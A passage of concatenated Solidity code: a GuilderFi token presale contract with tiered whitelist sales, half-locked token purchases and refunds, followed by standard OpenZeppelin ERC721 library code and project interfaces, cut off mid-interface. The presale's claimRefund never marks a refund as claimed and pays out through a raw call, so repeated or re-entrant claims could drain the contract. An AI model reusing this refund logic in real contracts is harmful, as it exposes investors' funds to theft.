  mapping(uint256 => uint256) private _saleCaps;
  mapping(uint256 => uint256) private _saleCloseDates;

  uint256 private _softCap = 10000 ether;
  uint256 private _lockDuration = 30 days;

  // flags
  bool private _isRefundActivated = false;
  uint256 private _tokensSold = 0;
  bool private _isSaleClosed = false;
  uint256 private _saleCloseDate;

  // contracts
  IGuilderFi private _token;

  modifier onlyTokenOwner() {
    require(msg.sender == address(_token.getOwner()), "Sender is not _token owner");
    _;
  }

  constructor() {
    _token = IGuilderFi(msg.sender);

    tiers.push(tier1);
    tiers.push(tier2);
    tiers.push(tier3);
    tiers.push(tier4);
    tiers.push(publicSale);
  }

  /**
   * Given a wallet address, return the tier information for that wallet
   * If tierId = 0, this means the wallet is not white listed and should
   * be treated as a public sale participant.
   */
  function getTier(address _address) public view returns (
    uint256 tierId,
    uint256 minAmount,
    uint256 maxAmount,
    uint256 tokensPerEth
  ) {
    uint256 _tierId = whitelist[_address];

    // loop through tiers
    for (uint256 i = 0; i< tiers.length; i++) {
      Tier memory tier = tiers[i];

      // find matching tier
      if (tier.tierId == _tierId) {
        return (
          tier.tierId,
          tier.minAmount,
          tier.maxAmount,
          tier.tokensPerEth
        );
      }
    }

    // default to public sale if no matching tier found
    return (
      publicSale.tierId,
      publicSale.minAmount,
      publicSale.maxAmount,
      publicSale.tokensPerEth
    );
  }

  /**
   * Buy tokens - number of tokens determined by tier
   */
  function buyTokens() public payable {
    require(!_isSaleClosed, "Sale is closed");

    (uint256 tierId, uint256 minAmount, uint256 maxAmount, uint256 tokensPerEth) = getTier(msg.sender);

    bool _isSaleActive = _isSaleOpen[tierId] &&
      (_saleCloseDates[tierId] == 0 || block.timestamp < _saleCloseDates[tierId]);

    require(_isSaleActive, tierId == 0 ? "Public sale is not open" : "Whitelist sale is not open");
    require(msg.value >= minAmount, "Purchase amount too low");
    require(msg.value <= maxAmount, "Purchase amount too high");
    require(_purchaseAmount[msg.sender].add(msg.value) <= maxAmount, "Total purchases exceed limit");

    uint256 tokenAmount = msg.value.mul(tokensPerEth).div(1 ether);
    _tokensSold = _tokensSold.add(tokenAmount);

    require(_token.balanceOf(address(this)) >= tokenAmount, "Presale requires more tokens");

    bool isFirstPurchase = _purchaseAmount[msg.sender] == 0;
    _purchaseAmount[msg.sender] = _purchaseAmount[msg.sender].add(msg.value);

    // check if locker exists
    ILocker userLocker = _lockers[msg.sender];

    if (address(userLocker) == address(0)) {
      // create a new locker
      userLocker = new Locker(address(this), address(_token));
      _lockers[msg.sender] = userLocker;
    }

    // calculate tokens to lock (50%)
    uint256 tokensToLock = tokenAmount.div(2);
    uint256 tokensToTransfer = tokenAmount.sub(tokensToLock);

    // deposit half tokens into the locker
    _token.transfer(address(userLocker), tokensToLock);

    // sending half tokens to the user
    _token.transfer(msg.sender, tokensToTransfer);

    // gift a safe exit NFT if its the first time buying
    if (isFirstPurchase) {
      ISafeExitFund _safeExit = ISafeExitFund(_token.getSafeExitFundAddress());
      _safeExit.mintRandom(msg.sender);
      _safeExit.capturePresalePurchaseAmount(msg.sender, msg.value);
    }
  }

  /**
   * Finalise pre-sale and distribute funds:
   * - Liquidity pool: 60%
   * - Treasury: 16%
   * - Safe Exit Fund: 12%
   * - Liquidity Relief Fund: 12%
   * 
   * If soft cap is not reached, allow participants to claim a refund
   */
  function finalizeSale() override external onlyTokenOwner {
    // if soft cap reached, distribute to other contracts
    uint256 totalEth = address(this).balance;

    _isSaleClosed = true;
    _saleCloseDate = block.timestamp;

    if (totalEth < _softCap) {
      _isRefundActivated = true;
    }
    else {
      // distribute 60% to liquidity pool
      uint256 liquidityEthAmount = totalEth.mul(60 ether).div(100 ether);
      uint256 liquidityTokenAmount = _tokensSold.mul(60 ether).div(100 ether);

      require(liquidityTokenAmount <= _token.balanceOf(address(this)), "Insufficient liquidity tokens");

      IDexRouter router = IDexRouter(_token.getRouter());
      router.addLiquidityETH{value: liquidityEthAmount} (
        address(_token),
        liquidityTokenAmount,
        0,
        0,
        _token.getTreasuryAddress(),
        block.timestamp
      );

      ISafeExitFund safeExitFund = ISafeExitFund(_token.getSafeExitFundAddress());

      // distribute 12% to safe exit fund
      uint256 safeExitEthAmount = totalEth.mul(12 ether).div(100 ether);
      payable(address(safeExitFund)).transfer(safeExitEthAmount);

      // set safe exit activation date for 30 days
      safeExitFund.setActivationDate(block.timestamp + 30 days);

      // distribute 12% to liquidity relief fund (LRF)
      uint256 lrfEthAmount = totalEth.mul(12 ether).div(100 ether);
      payable(_token.getLrfAddress()).transfer(lrfEthAmount);

      // distribute remaining 16% to treasury
      uint256 treasuryEthAmount = totalEth.sub(liquidityEthAmount).sub(safeExitEthAmount).sub(lrfEthAmount);
      payable(_token.getTreasuryAddress()).transfer(treasuryEthAmount);

      // refund remaining tokens to treasury
      _token.transfer(_token.getTreasuryAddress(), _token.balanceOf(address(this)));
    }
  }

  /**
   * Claim refund
   */
  function claimRefund() override external returns (bool) {
    require(_isSaleClosed, "Sale is not closed");
    require(_isRefundActivated, "Refunds are not available");
    require(!_refundClaimed[msg.sender], "Refund already claimed");
    
    uint256 refundEthAmount = _purchaseAmount[msg.sender];
    (bool success,) = payable(msg.sender).call{ value: refundEthAmount }("");
    return success;
  }

  /**
   * Unlock tokens in user locker
   */
  function unlockTokens() override external {
    require(_isSaleClosed, "Sale is not closed yet");
    require(block.timestamp >= _saleCloseDate + _lockDuration, "Tokens cannot be unlocked yet");

    ILocker userLocker = _lockers[msg.sender];
    userLocker.withdraw(msg.sender);
  }

  /**
   * Cancel sale
   */
  function cancelSale() override external onlyTokenOwner {
    _isSaleClosed = true;
    _saleCloseDate = block.timestamp;
    _isRefundActivated = true;
  }

  /**
   * Public getter functions
   */
  function token() public view override returns (address) { return address(_token); }
  function isPublicSaleOpen() public view override returns (bool) { return _isSaleOpen[0]; }
  function isWhitelistSaleOpen(uint256 tierId) public view override returns (bool) { return _isSaleOpen[tierId]; }
  function softCap() public view override returns (uint256) { return _softCap; }
  function publicSaleCloseDate() public view override returns (uint256) { return _saleCloseDates[0]; }
  function whitelistSaleCloseDate(uint256 tierId) public view override returns (uint256) { return _saleCloseDates[tierId]; }
  function lockerUnlockDate() public view override returns (uint256) { return _isSaleClosed ? _saleCloseDate + _lockDuration : 0; }
  function isRefundActivated() public view override returns (bool) { return _isRefundActivated; }
  function purchaseAmount(address _address) public view override returns (uint256) { return _purchaseAmount[_address]; }
  function refundClaimed(address _address) public view override returns (bool) { return _refundClaimed[_address]; }
  function locker(address _address) public view override returns (address) { return address(_lockers[_address]); }
  function tokensSold() public view override returns (uint256) { return _tokensSold; }
  function lockDuration() public view override returns (uint256) { return _lockDuration; }
  function isSaleClosed() public view override returns (bool) { return _isSaleClosed; }
  
  /**
   * External setter functions
   */
  function openPublicSale(bool isOpen) override external onlyTokenOwner {
    _isSaleOpen[0] = isOpen;
  }

  function openWhitelistSale(uint256 tierId, bool isOpen) override external onlyTokenOwner {
    _isSaleOpen[tierId] = isOpen;
  }

  function setSoftCap(uint256 softCapAmount) override external onlyTokenOwner {
    _softCap = softCapAmount;
  }

  function setPublicSaleCloseDate(uint256 date) override external onlyTokenOwner {
    _saleCloseDates[0] = date;
  }

  function setWhitelistSaleCloseDate(uint256 tierId, uint256 date) override external onlyTokenOwner {
    _saleCloseDates[tierId] = date;
  }

  function setLockDuration(uint256 duration) override external onlyTokenOwner {
    _lockDuration = duration;
  }

  function addToWhitelist(address[] memory _addresses, uint256 _tierId) override external onlyTokenOwner {
    for (uint256 i = 0; i < _addresses.length; i++) {
      whitelist[_addresses[i]] = _tierId;
    }
  }

  function removeFromWhitelist(address[] memory _addresses) override external onlyTokenOwner {
    for (uint256 i = 0; i < _addresses.length; i++) {
      whitelist[_addresses[i]] = 0;
    }
  }

  function addCustomTier (
    uint256 tierId,
    uint256 minPurchaseAmount,
    uint256 maxPurchaseAmount,
    uint256 tokensPerEth
  ) external override onlyTokenOwner {
    tiers.push(Tier(tierId, minPurchaseAmount, maxPurchaseAmount, tokensPerEth));
  }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface ISwapEngine {

    function execute() external;
    function recordFees(uint256 lrfAmount, uint256 safeExitAmount, uint256 treasuryAmount) external;
    function isEnabled() external view returns (bool);
    function setEnabled(bool _enable) external;
    function withdraw(uint256 amount) external;
    function withdrawTokens(address token, uint256 amount) external;
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface ILiquidityReliefFund {

    function execute() external;
    function withdraw(uint256 amount) external;
    function withdrawTokens(address token, uint256 amount) external;
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface IAutoLiquidityEngine {

    function execute() external;
    function withdraw(uint256 amount) external;
    function withdrawTokens(address token, uint256 amount) external;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/extensions/ERC721Enumerable.sol)

pragma solidity ^0.8.0;

import "../ERC721.sol";
import "./IERC721Enumerable.sol";

/**
 * @dev This implements an optional extension of {ERC721} defined in the EIP that adds
 * enumerability of all the token ids in the contract as well as all token ids owned by each
 * account.
 */
abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
    // Mapping from owner to list of owned token IDs
    mapping(address => mapping(uint256 => uint256)) private _ownedTokens;

    // Mapping from token ID to index of the owner tokens list
    mapping(uint256 => uint256) private _ownedTokensIndex;

    // Array with all token ids, used for enumeration
    uint256[] private _allTokens;

    // Mapping from token id to position in the allTokens array
    mapping(uint256 => uint256) private _allTokensIndex;

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, ERC721) returns (bool) {
        return interfaceId == type(IERC721Enumerable).interfaceId || super.supportsInterface(interfaceId);
    }

    /**
     * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
     */
    function tokenOfOwnerByIndex(address owner, uint256 index) public view virtual override returns (uint256) {
        require(index < ERC721.balanceOf(owner), "ERC721Enumerable: owner index out of bounds");
        return _ownedTokens[owner][index];
    }

    /**
     * @dev See {IERC721Enumerable-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _allTokens.length;
    }

    /**
     * @dev See {IERC721Enumerable-tokenByIndex}.
     */
    function tokenByIndex(uint256 index) public view virtual override returns (uint256) {
        require(index < ERC721Enumerable.totalSupply(), "ERC721Enumerable: global index out of bounds");
        return _allTokens[index];
    }

    /**
     * @dev Hook that is called before any token transfer. This includes minting
     * and burning.
     *
     * Calling conditions:
     *
     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
     * transferred to `to`.
     * - When `from` is zero, `tokenId` will be minted for `to`.
     * - When `to` is zero, ``from``'s `tokenId` will be burned.
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, tokenId);

        if (from == address(0)) {
            _addTokenToAllTokensEnumeration(tokenId);
        } else if (from != to) {
            _removeTokenFromOwnerEnumeration(from, tokenId);
        }
        if (to == address(0)) {
            _removeTokenFromAllTokensEnumeration(tokenId);
        } else if (to != from) {
            _addTokenToOwnerEnumeration(to, tokenId);
        }
    }

    /**
     * @dev Private function to add a token to this extension's ownership-tracking data structures.
     * @param to address representing the new owner of the given token ID
     * @param tokenId uint256 ID of the token to be added to the tokens list of the given address
     */
    function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {
        uint256 length = ERC721.balanceOf(to);
        _ownedTokens[to][length] = tokenId;
        _ownedTokensIndex[tokenId] = length;
    }

    /**
     * @dev Private function to add a token to this extension's token tracking data structures.
     * @param tokenId uint256 ID of the token to be added to the tokens list
     */
    function _addTokenToAllTokensEnumeration(uint256 tokenId) private {
        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }

    /**
     * @dev Private function to remove a token from this extension's ownership-tracking data structures. Note that
     * while the token is not assigned a new owner, the `_ownedTokensIndex` mapping is _not_ updated: this allows for
     * gas optimizations e.g. when performing a transfer operation (avoiding double writes).
     * This has O(1) time complexity, but alters the order of the _ownedTokens array.
     * @param from address representing the previous owner of the given token ID
     * @param tokenId uint256 ID of the token to be removed from the tokens list of the given address
     */
    function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {
        // To prevent a gap in from's tokens array, we store the last token in the index of the token to delete, and
        // then delete the last slot (swap and pop).

        uint256 lastTokenIndex = ERC721.balanceOf(from) - 1;
        uint256 tokenIndex = _ownedTokensIndex[tokenId];

        // When the token to delete is the last token, the swap operation is unnecessary
        if (tokenIndex != lastTokenIndex) {
            uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];

            _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
            _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index
        }

        // This also deletes the contents at the last position of the array
        delete _ownedTokensIndex[tokenId];
        delete _ownedTokens[from][lastTokenIndex];
    }

    /**
     * @dev Private function to remove a token from this extension's token tracking data structures.
     * This has O(1) time complexity, but alters the order of the _allTokens array.
     * @param tokenId uint256 ID of the token to be removed from the tokens list
     */
    function _removeTokenFromAllTokensEnumeration(uint256 tokenId) private {
        // To prevent a gap in the tokens array, we store the last token in the index of the token to delete, and
        // then delete the last slot (swap and pop).

        uint256 lastTokenIndex = _allTokens.length - 1;
        uint256 tokenIndex = _allTokensIndex[tokenId];

        // When the token to delete is the last token, the swap operation is unnecessary. However, since this occurs so
        // rarely (when the last minted token is burnt) that we still do the swap here to avoid the gas cost of adding
        // an 'if' statement (like in _removeTokenFromOwnerEnumeration)
        uint256 lastTokenId = _allTokens[lastTokenIndex];

        _allTokens[tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
        _allTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index

        // This also deletes the contents at the last position of the array
        delete _allTokensIndex[tokenId];
        _allTokens.pop();
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/ERC721.sol)

pragma solidity ^0.8.0;

import "./IERC721.sol";
import "./IERC721Receiver.sol";
import "./extensions/IERC721Metadata.sol";
import "../../utils/Address.sol";
import "../../utils/Context.sol";
import "../../utils/Strings.sol";
import "../../utils/introspection/ERC165.sol";

/**
 * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
 * the Metadata extension, but not including the Enumerable extension, which is available separately as
 * {ERC721Enumerable}.
 */
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    using Address for address;
    using Strings for uint256;

    // Token name
    string private _name;

    // Token symbol
    string private _symbol;

    // Mapping from token ID to owner address
    mapping(uint256 => address) private _owners;

    // Mapping owner address to token count
    mapping(address => uint256) private _balances;

    // Mapping from token ID to approved address
    mapping(uint256 => address) private _tokenApprovals;

    // Mapping from owner to operator approvals
    mapping(address => mapping(address => bool)) private _operatorApprovals;

    /**
     * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
        return
            interfaceId == type(IERC721).interfaceId ||
            interfaceId == type(IERC721Metadata).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    /**
     * @dev See {IERC721-balanceOf}.
     */
    function balanceOf(address owner) public view virtual override returns (uint256) {
        require(owner != address(0), "ERC721: balance query for the zero address");
        return _balances[owner];
    }

    /**
     * @dev See {IERC721-ownerOf}.
     */
    function ownerOf(uint256 tokenId) public view virtual override returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "ERC721: owner query for nonexistent token");
        return owner;
    }

    /**
     * @dev See {IERC721Metadata-name}.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev See {IERC721Metadata-symbol}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IERC721Metadata-tokenURI}.
     */
    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
        require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");

        string memory baseURI = _baseURI();
        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
    }

    /**
     * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
     * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
     * by default, can be overriden in child contracts.
     */
    function _baseURI() internal view virtual returns (string memory) {
        return "";
    }

    /**
     * @dev See {IERC721-approve}.
     */
    function approve(address to, uint256 tokenId) public virtual override {
        address owner = ERC721.ownerOf(tokenId);
        require(to != owner, "ERC721: approval to current owner");

        require(
            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
            "ERC721: approve caller is not owner nor approved for all"
        );

        _approve(to, tokenId);
    }

    /**
     * @dev See {IERC721-getApproved}.
     */
    function getApproved(uint256 tokenId) public view virtual override returns (address) {
        require(_exists(tokenId), "ERC721: approved query for nonexistent token");

        return _tokenApprovals[tokenId];
    }

    /**
     * @dev See {IERC721-setApprovalForAll}.
     */
    function setApprovalForAll(address operator, bool approved) public virtual override {
        _setApprovalForAll(_msgSender(), operator, approved);
    }

    /**
     * @dev See {IERC721-isApprovedForAll}.
     */
    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    /**
     * @dev See {IERC721-transferFrom}.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public virtual override {
        //solhint-disable-next-line max-line-length
        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");

        _transfer(from, to, tokenId);
    }

    /**
     * @dev See {IERC721-safeTransferFrom}.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public virtual override {
        safeTransferFrom(from, to, tokenId, "");
    }

    /**
     * @dev See {IERC721-safeTransferFrom}.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) public virtual override {
        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");
        _safeTransfer(from, to, tokenId, _data);
    }

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * `_data` is additional data, it has no specified format and it is sent in call to `to`.
     *
     * This internal function is equivalent to {safeTransferFrom}, and can be used to e.g.
     * implement alternative mechanisms to perform token transfer, such as signature-based.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function _safeTransfer(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _transfer(from, to, tokenId);
        require(_checkOnERC721Received(from, to, tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
    }

    /**
     * @dev Returns whether `tokenId` exists.
     *
     * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
     *
     * Tokens start existing when they are minted (`_mint`),
     * and stop existing when they are burned (`_burn`).
     */
    function _exists(uint256 tokenId) internal view virtual returns (bool) {
        return _owners[tokenId] != address(0);
    }

    /**
     * @dev Returns whether `spender` is allowed to manage `tokenId`.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
        require(_exists(tokenId), "ERC721: operator query for nonexistent token");
        address owner = ERC721.ownerOf(tokenId);
        return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender));
    }

    /**
     * @dev Safely mints `tokenId` and transfers it to `to`.
     *
     * Requirements:
     *
     * - `tokenId` must not exist.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function _safeMint(address to, uint256 tokenId) internal virtual {
        _safeMint(to, tokenId, "");
    }

    /**
     * @dev Same as {xref-ERC721-_safeMint-address-uint256-}[`_safeMint`], with an additional `data` parameter which is
     * forwarded in {IERC721Receiver-onERC721Received} to contract recipients.
     */
    function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, _data),
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }

    /**
     * @dev Mints `tokenId` and transfers it to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {_safeMint} whenever possible
     *
     * Requirements:
     *
     * - `tokenId` must not exist.
     * - `to` cannot be the zero address.
     *
     * Emits a {Transfer} event.
     */
    function _mint(address to, uint256 tokenId) internal virtual {
        require(to != address(0), "ERC721: mint to the zero address");
        require(!_exists(tokenId), "ERC721: token already minted");

        _beforeTokenTransfer(address(0), to, tokenId);

        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(address(0), to, tokenId);
    }

    /**
     * @dev Destroys `tokenId`.
     * The approval is cleared when the token is burned.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     *
     * Emits a {Transfer} event.
     */
    function _burn(uint256 tokenId) internal virtual {
        address owner = ERC721.ownerOf(tokenId);

        _beforeTokenTransfer(owner, address(0), tokenId);

        // Clear approvals
        _approve(address(0), tokenId);

        _balances[owner] -= 1;
        delete _owners[tokenId];

        emit Transfer(owner, address(0), tokenId);
    }

    /**
     * @dev Transfers `tokenId` from `from` to `to`.
     *  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     *
     * Emits a {Transfer} event.
     */
    function _transfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {
        require(ERC721.ownerOf(tokenId) == from, "ERC721: transfer of token that is not own");
        require(to != address(0), "ERC721: transfer to the zero address");

        _beforeTokenTransfer(from, to, tokenId);

        // Clear approvals from the previous owner
        _approve(address(0), tokenId);

        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(from, to, tokenId);
    }

    /**
     * @dev Approve `to` to operate on `tokenId`
     *
     * Emits a {Approval} event.
     */
    function _approve(address to, uint256 tokenId) internal virtual {
        _tokenApprovals[tokenId] = to;
        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);
    }

    /**
     * @dev Approve `operator` to operate on all of `owner` tokens
     *
     * Emits a {ApprovalForAll} event.
     */
    function _setApprovalForAll(
        address owner,
        address operator,
        bool approved
    ) internal virtual {
        require(owner != operator, "ERC721: approve to caller");
        _operatorApprovals[owner][operator] = approved;
        emit ApprovalForAll(owner, operator, approved);
    }

    /**
     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
     * The call is not executed if the target address is not a contract.
     *
     * @param from address representing the previous owner of the given token ID
     * @param to target address that will receive the tokens
     * @param tokenId uint256 ID of the token to be transferred
     * @param _data bytes optional data to send along with the call
     * @return bool whether the call correctly returned the expected magic value
     */
    function _checkOnERC721Received(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) private returns (bool) {
        if (to.isContract()) {
            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
                return retval == IERC721Receiver.onERC721Received.selector;
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    revert("ERC721: transfer to non ERC721Receiver implementer");
                } else {
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        } else {
            return true;
        }
    }

    /**
     * @dev Hook that is called before any token transfer. This includes minting
     * and burning.
     *
     * Calling conditions:
     *
     * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
     * transferred to `to`.
     * - When `from` is zero, `tokenId` will be minted for `to`.
     * - When `to` is zero, ``from``'s `tokenId` will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Counters.sol)

pragma solidity ^0.8.0;

/**
 * @title Counters
 * @author Matt Condon (@shrugs)
 * @dev Provides counters that can only be incremented, decremented or reset. This can be used e.g. to track the number
 * of elements in a mapping, issuing ERC721 ids, or counting request ids.
 *
 * Include with `using Counters for Counters.Counter;`
 */
library Counters {
    struct Counter {
        // This variable should never be directly accessed by users of the library: interactions must be restricted to
        // the library's function. As of Solidity v0.5.2, this cannot be enforced, though there is a proposal to add
        // this feature: see https://github.com/ethereum/solidity/issues/4637
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }

    function reset(Counter storage counter) internal {
        counter._value = 0;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ISafeExitFund {
  function execute(
    address sender,
    address recipient,
    uint256 tokenAmount
  ) external;

  function capturePresalePurchaseAmount(address _walletAddress, uint256 _amount) external;
  function claimSafeExit() external;
  function mintRandom(address _walletAddress) external;
  function mint(address _walletAddress, uint256 maxInsuranceAmount) external;

  // Public getter functions
  function maxSupply() external view returns (uint256);
  function unrevealedMetadataUri() external view returns (string memory);
  function usedMetadataUri() external view returns (string memory);
  function activationDate() external view returns (uint256);
  function tokenURI(uint256 _nftId) external view returns (string memory);
  function issuedTokens() external view returns (uint256);

  function getPackage(uint256 _nftId) external view returns (
    uint256 packageId,
    uint256 maxInsuranceAmount,
    string memory metadataUri
  );

  function getInsuranceStatus(address _walletAddress) external view returns (
    uint256 totalPurchaseAmount,
    uint256 maxInsuranceAmount,
    uint256 payoutAmount,
    uint256 premiumAmount,
    uint256 finalPayoutAmount    
  );

  // External setter functions
  function setRandomSeed(uint256 _randomSeed) external;
  function setCustomInsuranceLimit(uint256 _nftId, uint256 _limit) external;
  function setMetadataUri(uint256 _packageId, string memory _uri) external;
  function setUnrevealedMetadataUri(string memory _uri) external;
  function setUsedMetadataUri(string memory _uri) external;
  function setActivationDate(uint256 _date) external;
  function setMaxSupply(uint256 newMaxSupply) external;
  
  function withdraw(uint256 amount) external;
  function withdrawTokens(address _tokenAddress, uint256 amount) external;
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/extensions/IERC721Enumerable.sol)

pragma solidity ^0.8.0;

import "../IERC721.sol";

/**
 * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
 * @dev See https://eips.ethereum.org/EIPS/eip-721
 */
interface IERC721Enumerable is IERC721 {
    /**
     * @dev Returns the total amount of tokens stored by the contract.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
     * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
     */
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 tokenId);

    /**
     * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
     * Use along with {totalSupply} to enumerate all tokens.
     */
    function tokenByIndex(uint256 index) external view returns (uint256);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721.sol)

pragma solidity ^0.8.0;

import "../../utils/introspection/IERC165.sol";

/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
